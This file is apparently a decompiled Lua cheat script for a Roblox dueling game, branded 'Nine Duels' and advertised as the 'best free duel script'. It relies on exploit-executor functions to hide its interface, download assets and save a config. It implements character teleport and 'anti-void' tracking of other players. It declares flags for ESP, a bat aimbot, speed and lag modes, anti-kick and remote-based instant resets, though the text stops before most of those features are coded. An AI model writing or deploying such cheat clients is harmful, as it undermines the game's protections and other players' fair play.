do
	do
		do
			local obj, obj2, fn35, fn36

			do
				do
					Players = game:GetService("Players")
					TweenService = game:GetService("TweenService")
					UIS = game:GetService("UserInputService")
					RunService = game:GetService("RunService")
					Lighting = game:GetService("Lighting")
					HS = game:GetService("HttpService")
					player = Players.LocalPlayer
					ReplicatedStorage = game:GetService("ReplicatedStorage")
					toggleRefs = {}
					actionKeybinds = {}
					searchableItems = {}
					List = Instance.new("Frame")
					layoutOrderCounter = 0

					LO = function()
						layoutOrderCounter += 1
						return layoutOrderCounter
					end

					corner = function(parent, radius)
						local uiCorner = Instance.new("UICorner")
						uiCorner.CornerRadius = UDim.new(0, radius or 8)
						uiCorner.Parent = parent
						return uiCorner
					end

					stroke = function(parent, color, thickness, transparency)
						local uiStroke = Instance.new("UIStroke")
						uiStroke.Color = color
						uiStroke.Thickness = thickness or 1
						uiStroke.Transparency = transparency or 0
						uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
						uiStroke.Parent = parent
						return uiStroke
					end

					tween = function(object, properties, duration)
						TweenService:Create(
							object,
							TweenInfo.new(duration or 0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
							properties
						):Play()
					end

					getActiveStealDuration = function()
						return math.max(0.05, tonumber(Steal.StealDuration) or 0.2)
					end

					saveSettings = function()
						if saveConfig then
							saveConfig()
						end
					end

					pcall(function()
						local CoreGui = game:GetService("CoreGui")
						local playerGui = player:WaitForChild("PlayerGui")

						for _, v86 in ipairs({
							"PhantomLoader",
							"VanityLoadingScreen",
							"NineDuelsLoadingScreen",
							"VanityDeviceSelect",
							"NineDuelsDeviceSelect",
							"PhantomHub",
							"PhantomStealBar",
						}) do
							if CoreGui then
								local v87 = CoreGui:FindFirstChild(v86)

								if v87 then
									v87:Destroy()
								end
							end

							if playerGui then
								local v87 = playerGui:FindFirstChild(v86)

								if v87 then
									v87:Destroy()
								end
							end
						end
					end)

					loaderFinished = false
					skipLoadingScreen = false
					introEnabled = true

					NINEDUELS_INTRO_TRACKS = {
						["Main"] = {
							url = "https://cdn.imageurlgenerator.com/uploads/95917463-1685-4722-aa99-4d6d7b065d53.mp3",
							file = "nineduels_clean_intro.mp3",
						},
						["Song 2"] = {
							url = "https://cdn.imageurlgenerator.com/uploads/63c0949b-d95f-44c0-8aee-1531873398c2.mp3",
							file = "nineduels_song_2_intro.mp3",
						},
						["Song 3"] = {
							url = "https://cdn.imageurlgenerator.com/uploads/a68037de-fc9c-46c9-8d12-96c83a4703ea.mp3",
							file = "nineduels_song_3_intro.mp3",
						},
					}

					introSongChoice = "Main"
					introSoundInstance = nil
					introMusicRequest = 0

					stopNineDuelsIntroMusic = function()
						introMusicRequest = (introMusicRequest or 0) + 1

						if introSoundInstance then
							pcall(function()
								introSoundInstance:Stop()
							end)

							pcall(function()
								introSoundInstance:Destroy()
							end)

							introSoundInstance = nil
						end
					end

					playNineDuelsIntroMusic = function()
						if not introSoundEnabled then
							return
						end
						introMusicRequest = (introMusicRequest or 0) + 1
						local v86 = introMusicRequest
						local main = NINEDUELS_INTRO_TRACKS[introSongChoice] or NINEDUELS_INTRO_TRACKS.Main

						local function fn37()
							if introMusicRequest ~= v86 or not introSoundEnabled then
								return
							end

							pcall(function()
								if introSoundInstance then
									introSoundInstance:Destroy()
								end

								introSoundInstance = Instance.new("Sound")
								local soundId = nil

								if getcustomasset then
									local ok

									ok, soundId = pcall(function()
										return getcustomasset(main.file)
									end)

									local v87 = nil

									if not ok then
										soundId = v87
									end
								end

								introSoundInstance.SoundId = soundId or main.url
								introSoundInstance.Volume = 1
								introSoundInstance.Looped = false
								introSoundInstance.Parent = game:GetService("CoreGui")
								introSoundInstance:Play()
							end)
						end

						local v87 = false

						pcall(function()
							if isfile and isfile(main.file) then
								v87 = true
							end
						end)

						if v87 then
							fn37()
						else
							task.spawn(function()
								local ok, result = pcall(function()
									return game:HttpGet(main.url)
								end)

								if ok and result and introMusicRequest == v86 then
									if writefile then
										pcall(function()
											writefile(main.file, result)
										end)
									end

									fn37()
								end
							end)
						end

						return
					end

					task.spawn(function()
						if makefolder and isfolder and not isfolder("NineDuelsV1configLOL1") then
							pcall(makefolder, "NineDuelsV1configLOL1")
						end

						introSoundEnabled = true
						introSongChoice = "Main"

						if isfile and isfile("NineDuelsV1configLOL1/Config.json") then
							local ok, result = pcall(function()
								return HS:JSONDecode(readfile("NineDuelsV1configLOL1/Config.json"))
							end)

							if ok and type(result) == "table" then
								if type(result.introEnabled) == "boolean" then
									introEnabled = result.introEnabled
								end

								if result.introSoundEnabled ~= nil then
									introSoundEnabled = result.introSoundEnabled
								end

								local v86 = "string"

								if
									type(result.introSongChoice) == v86
									and NINEDUELS_INTRO_TRACKS[result.introSongChoice]
								then
									introSongChoice = result.introSongChoice
								end
							end
						end

						if not introEnabled then
							stopNineDuelsIntroMusic()
							loaderFinished = true
							return
						end

						playNineDuelsIntroMusic()
						local playerGui = player:WaitForChild("PlayerGui")

						pcall(function()
							local service = game:GetService("CoreGui")

							if service then
								playerGui = service
							end
						end)

						local nineDuelsLoadingScreen = playerGui:FindFirstChild("NineDuelsLoadingScreen")

						if nineDuelsLoadingScreen then
							nineDuelsLoadingScreen:Destroy()
						end

						local instance = Instance.new("ScreenGui")
						instance.Name = "NineDuelsLoadingScreen"
						instance.ResetOnSpawn = false
						instance.IgnoreGuiInset = true
						instance.DisplayOrder = 999
						instance.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
						instance.Parent = playerGui

						pcall(function()
							if syn and syn.protect_gui then
								syn.protect_gui(instance)
							end
						end)

						local frame = Instance.new("Frame")
						frame.Name = "Background"
						frame.Size = UDim2.fromScale(1, 1)
						frame.Position = UDim2.fromScale(0, 0)
						frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
						frame.BorderSizePixel = 0
						frame.ZIndex = 1
						frame.Parent = instance
						local uiGradient = Instance.new("UIGradient", frame)
						local colorSequence = ColorSequence.new
						local tbl17 = {}
						local v86 = ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0))
						local v87 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(12, 12, 12))
						tbl17[1] = v86
						tbl17[2] = v87

						do
							local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0)))
							table.move(values, 1, values.n, 3, tbl17)
						end

						uiGradient.Color = colorSequence(tbl17)
						uiGradient.Rotation = 90
						local frame2 = Instance.new("Frame")
						frame2.Name = "MainContainer"
						frame2.Size = UDim2.fromOffset(420, 500)
						frame2.AnchorPoint = Vector2.new(0.5, 0.5)
						frame2.Position = UDim2.fromScale(0.5, 0.48)
						frame2.BackgroundTransparency = 1
						frame2.ZIndex = 2
						frame2.Parent = frame
						local uiListLayout = Instance.new("UIListLayout", frame2)
						uiListLayout.FillDirection = Enum.FillDirection.Vertical
						uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
						uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
						uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
						uiListLayout.Padding = UDim.new(0, 14)
						local frame3 = Instance.new("Frame", frame2)
						frame3.Name = "LogoContainer"
						frame3.Size = UDim2.fromOffset(560, 110)
						frame3.BackgroundTransparency = 1
						frame3.LayoutOrder = 1
						frame3.ZIndex = 2
						local uiListLayout2 = Instance.new("UIListLayout", frame3)
						uiListLayout2.FillDirection = Enum.FillDirection.Horizontal
						uiListLayout2.HorizontalAlignment = Enum.HorizontalAlignment.Center
						uiListLayout2.VerticalAlignment = Enum.VerticalAlignment.Center
						uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
						local instance2 = Instance.new("TextLabel", frame3)
						instance2.Name = "NineDuels"
						instance2.Size = UDim2.fromOffset(520, 110)
						instance2.BackgroundTransparency = 1
						instance2.Text = "NINE"
						instance2.TextColor3 = Color3.fromRGB(255, 255, 255)
						instance2.Font = Enum.Font.GothamBlack
						instance2.TextScaled = true
						instance2.TextXAlignment = Enum.TextXAlignment.Right
						instance2.LayoutOrder = 1
						instance2.ZIndex = 2
						instance2.TextTransparency = 1
						local textLabel = Instance.new("TextLabel", frame3)
						textLabel.Name = "VS"
						textLabel.Size = UDim2.fromOffset(140, 110)
						textLabel.BackgroundTransparency = 1
						textLabel.Text = "DUELS"
						textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
						textLabel.Font = Enum.Font.GothamBlack
						textLabel.TextScaled = true
						textLabel.TextXAlignment = Enum.TextXAlignment.Left
						textLabel.LayoutOrder = 2
						textLabel.ZIndex = 2
						textLabel.TextTransparency = 1
						local textLabel2 = Instance.new("TextLabel", frame2)
						textLabel2.Name = "Subtitle"
						textLabel2.Size = UDim2.fromOffset(600, 42)
						textLabel2.BackgroundTransparency = 1
						textLabel2.Text = "Welcome " .. player.Name
						textLabel2.TextColor3 = Color3.fromRGB(240, 240, 240)
						textLabel2.Font = Enum.Font.GothamMedium
						textLabel2.TextScaled = true
						textLabel2.LayoutOrder = 2
						textLabel2.ZIndex = 2
						textLabel2.TextTransparency = 1
						local textLabel3 = Instance.new("TextLabel", frame2)
						textLabel3.Name = "Thanks"
						textLabel3.Size = UDim2.fromOffset(600, 30)
						textLabel3.BackgroundTransparency = 1
						textLabel3.Text = "BEST FREE DUEL SCRIPT"
						textLabel3.TextColor3 = Color3.fromRGB(210, 210, 210)
						textLabel3.Font = Enum.Font.Gotham
						textLabel3.TextScaled = true
						textLabel3.LayoutOrder = 3
						textLabel3.ZIndex = 2
						textLabel3.TextTransparency = 1
						local frame4 = Instance.new("Frame", frame2)
						frame4.Name = "Spacer"
						frame4.Size = UDim2.fromOffset(1, 20)
						frame4.BackgroundTransparency = 1
						frame4.LayoutOrder = 4
						local instance3 = Instance.new("Frame", frame2)
						instance3.Name = "BarBackground"
						instance3.Size = UDim2.fromOffset(320, 6)
						instance3.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
						instance3.BorderSizePixel = 0
						instance3.ZIndex = 2
						instance3.BackgroundTransparency = 1
						instance3.LayoutOrder = 5
						Instance.new("UICorner", instance3).CornerRadius = UDim.new(1, 0)
						local frame5 = Instance.new("Frame", instance3)
						frame5.Name = "Fill"
						frame5.Size = UDim2.fromScale(0, 1)
						frame5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
						frame5.BorderSizePixel = 0
						frame5.ZIndex = 3
						Instance.new("UICorner", frame5).CornerRadius = UDim.new(1, 0)
						local colorSequence2 = ColorSequence.new

						Instance.new("UIGradient", frame5).Color = colorSequence2({
							ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
							ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 120, 120)),
						})

						local textLabel4 = Instance.new("TextLabel", frame)
						textLabel4.Name = "Footer"
						textLabel4.Size = UDim2.fromOffset(600, 25)
						textLabel4.AnchorPoint = Vector2.new(0.5, 1)
						textLabel4.Position = UDim2.fromScale(0.5, 0.97)
						textLabel4.BackgroundTransparency = 1
						textLabel4.Text = "NINE DUELS  /  INITIALIZING"
						textLabel4.TextColor3 = Color3.fromRGB(120, 120, 120)
						textLabel4.Font = Enum.Font.Gotham
						textLabel4.TextScaled = true
						textLabel4.ZIndex = 2
						textLabel4.TextTransparency = 1

						local function fn37(arg, arg2, arg3, arg4, arg5)
							local tween_ = TweenService:Create(
								arg,
								TweenInfo.new(
									arg3 or 0.5,
									arg4 or Enum.EasingStyle.Quad,
									arg5 or Enum.EasingDirection.Out
								),
								arg2
							)
							tween_:Play()
							return tween_
						end

						fn37(instance2, { TextTransparency = 0 }, 0.4)
						fn37(textLabel, { TextTransparency = 0 }, 0.6)
						task.wait(0.3)
						fn37(textLabel2, { TextTransparency = 0 }, 0.5)
						task.wait(0.15)
						fn37(textLabel3, { TextTransparency = 0 }, 0.5)
						task.wait(0.5)
						fn37(instance3, { BackgroundTransparency = 0 }, 0.4)
						task.wait(0.1)
						fn37(textLabel4, { TextTransparency = 0.3 }, 0.5)
						fn37(
							frame5,
							{ Size = UDim2.fromScale(1, 1) },
							1.6,
							Enum.EasingStyle.Quad,
							Enum.EasingDirection.InOut
						)
						task.wait(1)

						if instance then
							local v88 = fn37(frame, { BackgroundTransparency = 1 }, 1)
							fn37(instance2, { TextTransparency = 1 }, 0.6)
							fn37(textLabel, { TextTransparency = 1 }, 0.6)
							fn37(textLabel2, { TextTransparency = 1 }, 0.4)
							fn37(textLabel3, { TextTransparency = 1 }, 0.6)
							fn37(instance3, { BackgroundTransparency = 1 }, 0.6)
							fn37(frame5, { BackgroundTransparency = 1 }, 0.6)
							fn37(textLabel4, { TextTransparency = 1 }, 0.4)
							v88.Completed:Wait()
						end

						if instance then
							instance:Destroy()
						end

						loaderFinished = true
					end)

					repeat
						task.wait()
					until loaderFinished

					repeat
						task.wait()
					until game:IsLoaded()

					_phantomModeIsMobile = false
					_phantomSavedDeviceMode = nil
					_savedGuiScale = nil

					do
						local json = isfile and isfile("NineDuelsV1configLOL1/Config.json")
						local deviceMode = nil

						if json then
							local ok, result = pcall(function()
								return HS:JSONDecode(readfile("NineDuelsV1configLOL1/Config.json"))
							end)

							if ok then
								local v86 = "table"
								ok = type(result) == v86
							end

							ok = ok and (result.deviceMode == "pc" or result.deviceMode == "mobile")
							deviceMode = nil

							if ok then
								deviceMode = result.deviceMode
							end
						end

						if deviceMode then
							_phantomSavedDeviceMode = deviceMode
							_phantomModeIsMobile = deviceMode == "mobile"
						else
							_phantomModeIsMobile = UIS.TouchEnabled == true
								and not (UIS.KeyboardEnabled == true)
								and not (UIS.MouseEnabled == true)
							_phantomSavedDeviceMode = _phantomModeIsMobile and "mobile" or "pc"

							pcall(function()
								if makefolder and isfolder and not isfolder("NineDuelsV1configLOL1") then
									makefolder("NineDuelsV1configLOL1")
								end

								local tbl17 = {}

								if isfile and isfile("NineDuelsV1configLOL1/Config.json") then
									local ok, result = pcall(function()
										return HS:JSONDecode(readfile("NineDuelsV1configLOL1/Config.json"))
									end)

									if ok and type(result) == "table" then
										tbl17 = result
									end
								end

								tbl17.deviceMode = _phantomSavedDeviceMode

								if writefile then
									writefile("NineDuelsV1configLOL1/Config.json", HS:JSONEncode(tbl17))
								end
							end)
						end
					end
				end

				do
					local n32, n33, n34, n35, n36, obj3, obj4, fn37

					do
						CANDY_SKY_TAG = "PhantomSkyTheme"
						currentSkyTheme = "Night"

						CANDY_SKY_PRESETS = {
							Off = { kind = "off" },
							Night = {
								clock = 22,
								brightness = 2,
								ambient = { 110, 100, 120 },
								outAmb = { 120, 110, 140 },
								sky = {
									stars = 4000,
									moon = 18,
									sun = 0,
									moonTex = true,
								},
								atm = {
									dens = 0.45,
									color = { 120, 60, 180 },
									decay = { 60, 20, 100 },
									glare = 0.5,
									haze = 1.2,
								},
							},
							Aurora = {
								clock = 14,
								brightness = 3,
								ambient = { 140, 120, 140 },
								outAmb = { 160, 130, 150 },
								atm = {
									dens = 0.4,
									color = { 255, 80, 205 },
									decay = { 255, 20, 150 },
									glare = 2.5,
									haze = 3,
								},
								clouds = {
									cover = 0.7,
									dens = 1,
									color = { 255, 240, 250 },
								},
							},
							["Sunset"] = {
								clock = 17.5,
								brightness = 2.5,
								ambient = { 170, 120, 100 },
								outAmb = { 180, 120, 110 },
								sky = { stars = 0, sun = 25, moon = 0 },
								atm = {
									dens = 0.5,
									color = { 255, 130, 60 },
									decay = { 255, 80, 30 },
									glare = 2,
									haze = 2.5,
								},
								clouds = {
									cover = 0.4,
									dens = 0.55,
									color = { 255, 205, 140 },
								},
							},
							["Galaxy"] = {
								clock = 0,
								brightness = 1.5,
								ambient = { 70, 60, 100 },
								outAmb = { 200, 70, 110 },
								sky = {
									stars = 10000,
									moon = 30,
									sun = 0,
								},
								atm = {
									dens = 0.5,
									color = { 40, 20, 200 },
									decay = { 20, 10, 50 },
									glare = 0.3,
									haze = 0.5,
								},
							},
							["Candy"] = {
								clock = 21,
								brightness = 2.2,
								ambient = { 90, 130, 170 },
								outAmb = { 100, 140, 180 },
								sky = { stars = 2000, moon = 12 },
								atm = {
									dens = 0.4,
									color = { 0, 205, 255 },
									decay = { 140, 0, 255 },
									glare = 2,
									haze = 2,
								},
								clouds = {
									cover = 0.4,
									dens = 0.6,
									color = { 100, 200, 255 },
								},
							},
							["Blood Moon"] = {
								clock = 23,
								brightness = 1.6,
								ambient = { 120, 40, 40 },
								outAmb = { 140, 50, 50 },
								sky = {
									stars = 1500,
									moon = 28,
									sun = 0,
									moonTex = true,
								},
								atm = {
									dens = 0.6,
									color = { 220, 30, 30 },
									decay = { 120, 10, 10 },
									glare = 1.4,
									haze = 2,
								},
								clouds = {
									cover = 0.5,
									dens = 0.7,
									color = { 120, 30, 30 },
								},
							},
							["Vapor"] = {
								clock = 19.5,
								brightness = 2.4,
								ambient = { 180, 120, 200 },
								outAmb = { 190, 130, 210 },
								sky = { stars = 3000, moon = 14 },
								atm = {
									dens = 0.45,
									color = { 255, 100, 220 },
									decay = { 120, 60, 255 },
									glare = 2.2,
									haze = 1,
								},
								clouds = {
									cover = 0.5,
									dens = 0.55,
									color = { 205, 140, 255 },
								},
							},
							Hellfire = {
								clock = 18,
								brightness = 1.8,
								ambient = { 200, 60, 30 },
								outAmb = { 220, 70, 36 },
								sky = {
									stars = 100,
									sun = 30,
									moon = 0,
								},
								atm = {
									dens = 0.5,
									color = { 255, 30, 0 },
									decay = { 120, 0, 0 },
									glare = 3.5,
									haze = 4,
								},
								clouds = {
									cover = 0.95,
									dens = 0.5,
									color = { 80, 20, 10 },
								},
							},
							Heaven = {
								clock = 12,
								brightness = 4,
								ambient = { 240, 235, 210 },
								outAmb = { 250, 245, 220 },
								sky = { sun = 16, moon = 0, stars = 0 },
								atm = {
									dens = 0.25,
									color = { 255, 250, 220 },
									decay = { 255, 240, 205 },
									glare = 3,
									haze = 1.5,
								},
								clouds = {
									cover = 0.85,
									dens = 0.5,
									color = { 255, 255, 255 },
								},
							},
							Storm = {
								clock = 15,
								brightness = 1.4,
								ambient = { 90, 90, 110 },
								outAmb = { 100, 100, 120 },
								sky = { stars = 0, sun = 6, moon = 0 },
								atm = {
									dens = 0.65,
									color = { 80, 90, 120 },
									decay = { 40, 50, 80 },
									glare = 0.5,
									haze = 3,
								},
								clouds = {
									cover = 0.95,
									dens = 0.95,
									color = { 60, 65, 80 },
								},
							},
							Space = {
								clock = 0,
								brightness = 1,
								ambient = { 30, 30, 50 },
								outAmb = { 40, 35, 60 },
								sky = { stars = 15000, moon = 0, sun = 0 },
								atm = {
									dens = 0.08,
									color = { 44, 5, 40 },
									decay = { 5, 0, 20 },
									glare = 0.2,
									haze = 0.3,
								},
							},
							["Lavender"] = {
								clock = 15,
								brightness = 2.6,
								ambient = { 180, 160, 220 },
								outAmb = { 190, 170, 230 },
								sky = { stars = 800, moon = 16, sun = 0 },
								atm = {
									dens = 0.4,
									color = { 200, 160, 255 },
									decay = { 160, 120, 220 },
									glare = 1.4,
									haze = 1,
								},
								clouds = {
									cover = 0.55,
									dens = 0.5,
									color = { 220, 205, 255 },
								},
							},
						}

						SkyOrder = {
							"Off",
							"Night",
							"Aurora",
							"Sunset",
							"Galaxy",
							"Candy",
							"Blood Moon",
							"Vapor",
							"Hellfire",
							"Heaven",
							"Storm",
							"Space",
							"Lavender",
						}

						candyColor = function(arg)
							return Color3.fromRGB(arg[1], arg[2], arg[3])
						end

						CandyApplyCustomSky = function(arg)
							for _, child in ipairs(Lighting:GetChildren()) do
								if child:GetAttribute(CANDY_SKY_TAG) then
									pcall(function()
										child:Destroy()
									end)
								end
							end

							local v86 = workspace:FindFirstChildOfClass("Terrain")

							if v86 then
								for _, child in ipairs(v86:GetChildren()) do
									if child:GetAttribute(CANDY_SKY_TAG) then
										pcall(function()
											child:Destroy()
										end)
									end
								end
							end

							local v87 = CANDY_SKY_PRESETS[arg]

							if not v87 or v87.kind == "off" then
								Lighting.ClockTime = 14
								Lighting.Brightness = 2
								Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
								Lighting.Ambient = Color3.fromRGB(127, 127, 127)
								Lighting.FogEnd = 100000
								Lighting.GlobalShadows = true
								return
							end

							Lighting.FogStart = 0
							Lighting.FogEnd = 100000
							Lighting.FogColor = Color3.fromRGB(200, 200, 205)
							Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
							Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
							Lighting.GlobalShadows = true
							Lighting.ClockTime = v87.clock or 14
							Lighting.Brightness = v87.brightness or 2

							if v87.outAmb then
								Lighting.OutdoorAmbient = candyColor(v87.outAmb)
							end

							if v87.ambient then
								Lighting.Ambient = candyColor(v87.ambient)
							end

							if v87.sky then
								local sky = Instance.new("Sky")
								sky:SetAttribute(CANDY_SKY_TAG, true)

								if v87.sky.stars then
									sky.StarCount = v87.sky.stars
								end

								if v87.sky.moon then
									sky.MoonAngularSize = v87.sky.moon
								end

								if v87.sky.sun then
									sky.SunAngularSize = v87.sky.sun
								end

								if v87.sky.moonTex then
									sky.MoonTextureId = "rbxasset://sky/moon.jpg"
								end

								sky.Parent = Lighting
							end

							if v87.atm then
								local instance = Instance.new("Atmosphere")
								instance:SetAttribute(CANDY_SKY_TAG, true)
								instance.Density = v87.atm.dens or 0.3
								instance.Color = candyColor(v87.atm.color)
								instance.Decay = candyColor(v87.atm.decay)
								instance.Glare = v87.atm.glare or 1
								instance.Haze = v87.atm.haze or 1
								instance.Parent = Lighting
							end

							if v87.clouds and v86 then
								local clouds = Instance.new("Clouds")
								clouds:SetAttribute(CANDY_SKY_TAG, true)
								clouds.Cover = v87.clouds.cover or 0.5
								clouds.Density = v87.clouds.dens or 0.5
								clouds.Color = candyColor(v87.clouds.color)
								clouds.Parent = v86
							end
						end

						TS = TweenService
						LP = Players.LocalPlayer
						NS = 58.5
						CS = 28.5
						LAGGER_SPEED = 15
						LAGGER_CARRY_SPEED = 24.5
						carrySpeedActive = false
						laggerModeEnabled = false
						laggerCarryToggled = false
						laggerPhase = 0
						laggerRestoreCarryState = false
						speedMode = false
						autoCarrySpeedEnabled = false
						antiVoidEnabled = false
						instantResetVersion = 1

						do
							local tbl17 = {
								MinX = -535.7,
								MaxX = -422,
								MinY = -7.9,
								MaxY = 115,
								MinZ = -72,
								MaxZ = 193.3,
							}

							n32 = 150
							n33 = 100
							n34 = 0.07
							n35 = 15
							n36 = 50
							obj = setmetatable({}, { __mode = "k" })
							obj3 = setmetatable({}, { __mode = "k" })
							obj2 = setmetatable({}, { __mode = "k" })
							obj4 = setmetatable({}, { __mode = "k" })

							fn35 = function()
								return antiVoidEnabled == true
							end

							fn37 = function(arg)
								local v86 = "Vector2"
								return typeof(arg) == v86
									and arg.X >= tbl17.MinX
									and arg.X <= tbl17.MaxX
									and arg.Y >= tbl17.MinY
									and arg.Y <= tbl17.MaxY
									and arg.Z >= tbl17.MinZ
									and arg.Z <= tbl17.MaxZ
							end
						end
					end

					local fn38

					do
						fn38 = function(arg, arg2)
							obj2[arg] = true
							obj3[arg] = arg2
							obj[arg] = arg2.Position
						end

						do
							local v86 = nil
							local v87 = nil
							local n37 = 0

							local function fn39()
								local character = LP.Character
								local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
								character = character and character:FindFirstChildOfClass("Humanoid")
								local flag18 = not humanoidRootPart or not character
								local flag19

								if flag18 then
									flag19 = flag18
								else
									local v88 = 0.2
									flag19 = os.clock() - n37 < v88
								end

								if flag19 then
									return
								end
								n37 = os.clock()
								local position = humanoidRootPart.Position

								if not v87 and fn37(position) then
									v87 = position
								end

								if character.FloorMaterial ~= Enum.Material.Air and fn37(position) then
									v86 = position
								end
							end

							local function fn40()
								local character = LP.Character
								local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
								if
									not humanoidRootPart
									or not humanoidRootPart.Parent
									or fn37(humanoidRootPart.Position)
								then
									return
								end
								local v88 = v86
								local v89

								if v86 then
									v89 = v88
								else
									v89 = v87
								end

								if v89 and fn37(v89) then
									pcall(function()
										humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
										humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
										humanoidRootPart.CFrame = CFrame.new(v89 + Vector3.new(0, 3, 0))
									end)
								end
							end

							RunService.Heartbeat:Connect(function()
								if fn35() then
									fn39()
									fn40()
								end
							end)

							LP.CharacterAdded:Connect(function()
								local v88 = 0
								v86 = nil
								v87 = nil
								n37 = v88
							end)
						end
					end

					do
						local function fn39(player_)
							if player_ == LP or obj4[player_] then
								return
							end
							obj4[player_] = true

							task.spawn(function()
								local tbl17 = {}
								local n37 = 0
								local v86 = nil

								while player_ and player_.Parent do
									if not fn35() then
										obj2[player_] = false
										tbl17 = {}
										task.wait(0.5)
										n37 = 0
										v86 = nil
									else
										local character = player_.Character
										local v87 = character and character:FindFirstChild("HumanoidRootPart")
										character = character and character:FindFirstChildOfClass("Humanoid")

										if v87 and character and character.Health > 0 then
											local now2 = tick()
											local cFrame = v87.CFrame
											local position = cFrame.Position

											if obj2[player_] then
												local n38

												if v86 then
													local n39 = position - v86
													local magnitude = Vector3.new(n39.X, 0, n39.Z).Magnitude

													if magnitude < n36 and fn37(position) then
														n38 = n37 + magnitude
													else
														n38 = n37
													end
												else
													n38 = n37
												end

												if not (n35 <= n38) then
													n37 = n38
													v86 = position
												else
													obj2[player_] = false
													obj[player_] = position
													obj3[player_] = cFrame
													tbl17 = {}
													n37 = 0
													v86 = nil
												end
											else
												obj[player_] = position
												obj3[player_] = cFrame
												table.insert(tbl17, { time = now2, cframe = cFrame })

												while #tbl17 > 0 and now2 - tbl17[1].time > n34 do
													table.remove(tbl17, 1)
												end

												local v88 = tbl17[1]
												n37 = 0

												if v88 then
													local position2 = v88.cframe.Position

													if
														(position - position2).Magnitude >= n32
														or math.abs(position.Y - position2.Y) >= n33
													then
														local cframe = v88.cframe

														if fn37(cframe.Position) then
															fn38(player_, cframe)
														end

														tbl17 = {}
														v86 = position
													else
														v86 = position
													end
												else
													v86 = position
												end
											end
										else
											obj2[player_] = false
											tbl17 = {}
											n37 = 0
											v86 = nil
										end

										RunService.Heartbeat:Wait()
									end
								end

								obj4[player_] = nil
							end)
						end

						Players.PlayerAdded:Connect(fn39)

						fn36 = function()
							for _, player_ in ipairs(Players:GetPlayers()) do
								fn39(player_)
							end
						end
					end
				end
			end

			do
				do
					do
						do
							do
								local function fn37()
									for k in pairs(obj2) do
										obj2[k] = false
									end
								end

								_G.NineDuelsAntiVoid = {
									setEnabled = function(arg)
										antiVoidEnabled = arg == true

										if antiVoidEnabled then
											fn36()
										else
											fn37()
										end
									end,
									isEnabled = function()
										return antiVoidEnabled == true
									end,
									posFor = function(arg, arg2)
										if fn35() and obj2[arg] and obj[arg] then
											return obj[arg], true
										end
										return arg2, false
									end,
									posForPart = function(arg, arg2)
										local model = arg and arg:FindFirstAncestorOfClass("Model")
										return _G.NineDuelsAntiVoid.posFor(
											model and Players:GetPlayerFromCharacter(model),
											arg2 or arg and arg.Position
										)
									end,
									isOut = function(arg)
										return obj2[arg] == true
									end,
									ghostOf = function(arg)
										return obj[arg]
									end,
								}
							end
						end

						fn36()

						do
							local v86 = false
							local v87 = false
							antiRagdollEnabled = true
							antiDieEnabled = true
							antiKickEnabled = false
							safeModeEnabled = false
							brainrotDetected = v86
							headlessEnabled = false
							korbloxEnabled = v87
						end
					end

					do
						infJumpEnabled = nil
						unwalkEnabled = false
						tryardAnimEnabled = false
						espEnabled = false
						selfEspEnabled = false
						selfBoxEspEnabled = false
						selectedWalkAnimation = "Adidas Aura"
						walkAnimationsEnabled = true
						walkAnimationConn = nil
						_walkOriginalAnims = nil
						_walkOriginalChar = nil
						dropActive = false
						autoLeftEnabled = false
						autoRightEnabled = false
						autoLeftSetVisual = nil
						autoRightSetVisual = nil
						speedLabel = nil
						speedometerValue = 0
						autoBatEnabled = false
						batCounterEnabled = false
						medusaCounterEnabled = false
						batCounterDebounce = false
						medusaDebounce = false
						medusaLastUsed = 0
						MEDUSA_COOLDOWN = 0.75
						autoSwingEnabled = true
						autoMoveSwingEnabled = false
						autoMoveSwingInterval = 0.3
						_alSwingDebounce = false
						_arSwingDebounce = false
						autoBatSetVisual = nil
						autoSwingSetVisual = nil
						resetAutoBatMotion = nil
						antiLagEnabled = false
						removeAccessoriesEnabled = false
						antiLagDescConn = nil
						stretchRezEnabled = false
						stretchRezConn = nil
						setStretchRezVisual = nil
						unwalkSavedAnimate = nil
						_anyKeyListening = false
						autoTPEnabled = false
						autoTPHeight = 20
						autoTPConn = nil
						setAutoTPVisual = nil
						cursedResetRemote = nil
						CURSED_RESET_GUID = "f888ee6e-c86d-46e1-93d7-0639d6635d42"
						guiTransparencyEnabled = false
						mobileButtonsEnabled = true
						mobileButtonsLocked = false
						mobileButtonsSize = 45

						if _phantomModeIsMobile then
							mobileButtonsSize = 45
						end

						circleButtonsEnabled = false
						stealBarFrame = nil
						mobBtnRefs = {}
						mobGuiRef = nil
						sideButtonsHidden = false

						sideButtonVisibility = {
							DROP_BR = true,
							AUTO_LEFT = true,
							BAT_AIMBOT = true,
							AUTO_RIGHT = true,
							TP_DOWN = true,
							CARRY_SPD = true,
							LAGGER_NORMAL = true,
							LAGGER_CARRY = true,
							ANTI_BAT = true,
							INSTA_RESET = true,
						}

						fovValue = 80
						fovOptions = { 80, 120, 180 }
						fovIndex = 1
						laggerModePillRef = nil
						carryModePillRef = nil
						autoSwitchSpeedEnabled = false
						autoSwitchLaggerCarryEnabled = false
						mobBtnTransparencyEnabled = false
						perButtonDragEnabled = false
						brainrotDetected = false
						ragdollGuiEnabled = true
						persistentRagdollGui = nil
						uiLocked = false
						infJumpMode = "classic"
						holdInfJumpConn = nil
						DROP_ASCEND_DURATION = 0.2
